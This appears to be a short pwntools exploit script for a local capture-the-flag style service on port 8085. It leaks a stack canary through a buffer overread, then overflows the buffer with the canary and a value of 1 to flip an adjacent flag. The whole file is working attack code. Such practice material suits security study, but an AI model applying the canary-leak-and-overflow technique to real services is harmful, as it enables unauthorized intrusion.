#!/usr/bin/python2

from pwn import *
import sys

s = remote('127.0.0.1',8085)
s.recvuntil('>')
s.send('m\n')
s.recvline()
s.send('a'*24 + '\n')
s.recvuntil('>')
s.send('d\n')
res = s.recvlines(3)
canary = res[2][-4:]
s.recvuntil('>')
s.send('m\n')
s.recvline()
s.send('a'*24 + canary + '\x01\x00\x00\x00\n')
s.recvuntil('>')
s.send('f\n')
print s.recvuntil('>')
s.close()
